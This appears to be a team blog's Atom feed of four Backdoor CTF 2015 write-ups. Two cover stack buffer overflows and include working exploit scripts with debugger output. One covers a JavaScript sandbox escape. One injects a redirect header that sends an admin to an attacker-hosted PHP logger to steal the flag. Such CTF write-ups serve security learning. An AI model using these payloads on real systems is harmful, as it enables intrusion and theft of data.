<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Backdoor | GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/blog/categories/backdoor/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2015-04-03T02:59:12+04:30</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - FORGOT Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/"/>
    <updated>2015-04-03T02:57:55+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 FORGOT Writeup</strong><br/>
<strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.<br/>
Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed here.</p></blockquote>

<pre><code>$ file forgot
forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped
</code></pre>

<pre><code>$ ./forgot 
What is your name?
&gt; AAAAAAAAA

Hi AAAAAAAAA


                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
&gt; AAAAAAAAAAAAAAAAAA
Dude, you seriously think this is going to work. Where are the fancy @ and [dot], huh?
</code></pre>

<p>without loosing time opening the binary into IDA shows us several functions but the General function to this functionality is <code>0x08047AA</code>. lets see the psuedo-code :</p>

<!--more-->


<pre><code>...
  puts("What is your name?");
  printf("&gt; ");
  fflush(stdout);
  fgets((char *)&amp;v19, 32, stdin);
  sub_80485DD(&amp;v19);
  fflush(stdout);
  printf("I should give you a pointer perhaps. Here: %x\n\n", sub_8048654);
  fflush(stdout);
  puts("Enter the string to be validate");
  printf("&gt; ");
  fflush(stdout);
  __isoc99_scanf("%s", &amp;v8);
  for ( i = 0; ; ++i )
 ...
</code></pre>

<p>This is the interesting part since we have control on inputs. <code>v19</code> is a 32 char buffer so no vulnerabilty is there. but what about <code>__isoc99_scanf("%s", &amp;v8);</code> ? obviously using <em>scanf</em> in such a manner is exteremly dangerous. <code>v8</code> also is a 32 char buffer. so it is also another stack buffer overflow like <code>ECHO</code>. lets check this condition :</p>

<pre><code>$ python -c 'print "GeeksSpeak\n"+"A"*40+"\n"' &gt; forgot.test
hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ cat forgot.test 
GeeksSpeak
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ ./forgot &lt; forgot.test 
What is your name?
&gt; 
Hi GeeksSpeak


                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
Segmentation fault (core dumped)
</code></pre>

<p>and <code>gdb</code> proves this too. but how should i read the flag? do we need ROP? or something simillar? i started dumping strings in IDA and located these:</p>

<pre><code>.rodata:08048D9F 00000007 C ./flag
.rodata:08048DA6 00000007 C cat %s
</code></pre>

<p>these strings had been used in <code>0x080486CC</code> and finding a call system proves that like ECHO we should just using this function as RET.</p>

<p>by using this piece of code we have:</p>

<pre><code class="python">#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='&gt; '):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) &gt; 0
        data += c
    return data

def p(v):
    return struct.pack('&lt;I', v)

def u(v):
    return struct.unpack('&lt;I', v)[0]


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('hack.bckdr.in', 8009))
f = s.makefile('rw', bufsize=0)

readuntil(f)
f.write("A\n")
readuntil(f)
f.write("A"*32+p(0x80486CC)+"\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<pre><code>$ python sol.py 
ebe2c4abf85c239c7bd0385a685c460b2c5fe1dcdb2236f87dfef826bb690adf
*** Connection closed by remote host ***
</code></pre>

<p>We&rsquo;ve got the flag. 200pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - CONCEALED Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup/"/>
    <updated>2015-04-03T02:33:31+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 CONCEALED Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>All paths have been concealed. Get the hidden flag: nc hack.bckdr.in 8005. Submit sha-256 of the flag</p></blockquote>

<pre><code>$ nc hack.bckdr.in 8005
######################################
####           CONCEAL            ####
######################################

Welcome to CONCEAL
You have access to object named sandboxed and its functions 
Rest everything is sandboxed, don't be a jerk and break something
Wrap your code in a function and return what you want as output
Flag is hidden somewhere in the code. 
Get the flag :D!

home@jail:$ 
</code></pre>

<p>First of all as banner says we should use all our payload as a function like :</p>

<!--more-->


<pre><code>home@jail:$ function exploit() { return "GeeksSpeak"; }
GeeksSpeak
home@jail:$ 
</code></pre>

<p>After some diging into the the challenge, trying to break the jail and so on, reading banner carefully indicates that the flag is in the code so i should read codes but how?</p>

<p>In javascript we can use arguments.caller to see which function calls our current function so i made up an example and tested it:</p>

<pre><code>home@jail:$ function exploit() { return exploit.caller.toString(); }
function () {return (function exploit() { return exploit.caller.toString(); })()}
home@jail:$ function exploit() { return (exploit.caller).caller.toString(); }
function () {
        if (!(this instanceof Script)) {
          throw new TypeError('invalid call to ' + f);
        }
        return ns[f].apply(ns, arguments);
      }
home@jail:$ 
</code></pre>

<p>this proved my idea, so i used caller repeatedly and finally got the flag as bellow:</p>

<pre><code>home@jail:$ function exploit() { return ((((((((exploit.caller).caller).caller).caller).caller).caller).caller).caller).caller.toString(); }
function (err, line) {

    // flag : 50_y0u_f1n4lly_f0und_17

    if (err &amp;&amp; wait === false) {
      return callback(err);
    }

    var against = {},
        numericInput,
        isValid;

    if (line !== '') {
      if (schema.properties[propName]) 
      [..stripped..]
</code></pre>

<p>and sha256 of the <code>50_y0u_f1n4lly_f0und_17</code> gives us another 150pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - ECHO Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup/"/>
    <updated>2015-04-03T02:12:58+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 ECHO Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Binary</strong></p>

<blockquote><p>Little Suzie started learning C. She created a simple program that echo&rsquo;s back whatever you input. Here is the binary file. The vampire came across this service on the internet. nc hack.bckdr.in 8002. Reports say he found a flag. See if you can get it.</p></blockquote>

<pre><code>$ file echo
echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=15ec07e5664a13e94069c818141cc9f70591d0f0, not stripped
</code></pre>

<p>As it seems we have a 32bit binary as a ECHO server. the output confirms this:</p>

<pre><code>$ nc hack.bckdr.in 8002
GeeksSpeak
ECHO: GeeksSpeak
</code></pre>

<p>opening the binary in IDA shows us that the main function calls test() as we can see the psuedo-code below :</p>

<!-- more -->


<pre><code>int test()
{
  char s; // [sp+1Eh] [bp-3Ah]@1

  gets(&amp;s);
  return fprintf(_bss_start, "ECHO: %s\n", &amp;s);
}
</code></pre>

<p>It&rsquo;s an obvious Stack buffer overflow. without loosing time i loaded it into <em>gdb</em> and used  cyclic pattern to find the offset:</p>

<pre><code>$ gdb ./echo -q
Reading symbols from ./echo...(no debugging symbols found)...done.
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ shell echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' &gt; echo.test
gdb-peda$ r &lt; echo.test 
Starting program: /home/hamidx9/ctf/backdoor/echo &lt; echo.test
ECHO: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[-----------------------------------------------------------------------------------------------------------registers-----------------------------------------------------------------------------------------------------------]
EAX: 0x6b (b'k')
EBX: 0xf7fae000 --&gt; 0x1a8da8 
ECX: 0x6b (b'k')
EDX: 0xf7faf86c --&gt; 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41324141 (b'AA2A')
ESP: 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
EIP: 0x41414841 (b'AHAA')
[-------------------------------------------------------------------------------------------------------------code--------------------------------------------------------------------------------------------------------------]
Invalid $PC address: 0x41414841
[-------------------------------------------------------------------------------------------------------------stack-------------------------------------------------------------------------------------------------------------]
00:0000| esp 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
01:0004|     0xffffcdd4 ("AAIAAeAA4AAJAAf"...)
02:0008|     0xffffcdd8 ("AeAA4AAJAAfAA5A"...)
03:0012|     0xffffcddc ("4AAJAAfAA5AAKAA"...)
04:0016|     0xffffcde0 ("AAfAA5AAKAAgAA6"...)
05:0020|     0xffffcde4 ("A5AAKAAgAA6AAL")
06:0024|     0xffffcde8 ("KAAgAA6AAL")
07:0028|     0xffffcdec ("AA6AAL")
[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]
Legend: stack, code, data, heap, rodata, value
Stopped reason: SIGSEGV
0x41414841 in ?? ()
gdb-peda$ pattern_offset 'AHAA'
AHAA found at offset: 62
gdb-peda$ 
</code></pre>

<p>So the <code>offset = 62</code>. but where should we jump? IDA shows us there is another function named <code>sample</code> which open <code>flag.txt</code> and print its content. All have to do is to call <code>sample</code> with address = <em>0x0804854d</em>.</p>

<p>Final payload looks like below :</p>

<pre><code>[A*62] + [0x0804854d in little endian]
</code></pre>

<p>And finally we&rsquo;ve got the flag:</p>

<pre><code>$ python -c 'import struct; q=lambda x: struct.pack("&lt;I", x); print "A"*62+q(0x0804854d)' | nc hack.bckdr.in 8002
ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM�
96f674623c2c378f89700aa46f02cf3b311489f0facdfac6fd5885d5bc1a129a
</code></pre>

<p>And another 100 pt.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - Medusa Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup/"/>
    <updated>2015-04-03T01:06:09+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor2015 Medusa Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Web</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>The html page you create will be visited by the backdoor admin with the flag.
You can enter a fake flag to simulate the challenge.</p>

<p>Get the flag at <a href="http://hack.bckdr.in/MEDUSA/">http://hack.bckdr.in/MEDUSA/</a></p></blockquote>

<p>After We open the link that is provided in description we are welcomed with a form.you can send message with html code and after that admin will visit your page with the flag.</p>

<!-- more -->


<p><img src="http://up.ashiyane.org/images/nxcfynwxymxjqi2v4u7.png" title="Medusa Form" alt="alt text" /></p>

<p>Backdoor CTF admin add a hint and mention that they sent flag as post request</p>

<p>this is sample request that admin sent :</p>

<p><a href="http://hack.bckdr.in/MEDUSA/view.php?id=ID&amp;flag=FLAG">http://hack.bckdr.in/MEDUSA/view.php?id=ID&amp;flag=FLAG</a></p>

<p>when you sent the message Medusa website create id for you.
you can visit your message with this id ( same as admin :D )</p>

<p><img src="http://up.ashiyane.org/images/wu0fm2e5n6shme48fj58.png" title="Message Read" alt="alt text" /></p>

<p>we test different method to get the flag value from post request with PHP or JavaScript in our page but we see error or blank page.</p>

<blockquote><p>after some investigation our team found answer !!!</p></blockquote>

<p>we can redirect admin to another page and get the flag</p>

<p>but if they sent request as post cant log the value in second page.so thinking to Referer attribute in the header.</p>

<p>write some code to get and save the Referer in the text file when admin redirect to our PHP page :
Server.php</p>

<pre><code>&lt;?php
$ref = $_SERVER['HTTP_REFERER'];
file_put_contents("flag.txt",$ref);
?&gt;
</code></pre>

<blockquote><p>and sent this code as our page to Medusa form :</p>

<pre><code>---
location: http://Attackerwebsite.com/server.php
---
Can you get the **flag**?
</code></pre>

<p>but after admin visit the link flag.txt is empty !!!</p></blockquote>

<p>no Referer sent to PHP page&hellip;</p>

<p>we test several time ( for this challenge or local tests ) and same result,no Referer save in flag.txt</p>

<p>after some research we found out with this kind of header redirection we cant get Referer and we should change that.</p>

<pre><code>---
Refresh: 0; url=http://Attackerwebsite.com/server.php
---
Can you get the **flag**?
</code></pre>

<p>and guess what?</p>

<blockquote><p>we have Referer Link in flag.txt :D</p></blockquote>

<p><a href="http://hack.bckdr.in/MEDUSA/view.php?flag=6bbaf4e1d3af423dd6c5a03c21c2a35c075392861709f2e896a27ae1f57d30c5&amp;id=d61d051c6e741595491c">Referer Link With Flag!</a></p>

<p>and now you have 100 point :D</p>

<p>WriteUp By Fr0nk</p>
]]></content>
  </entry>
  
</feed>
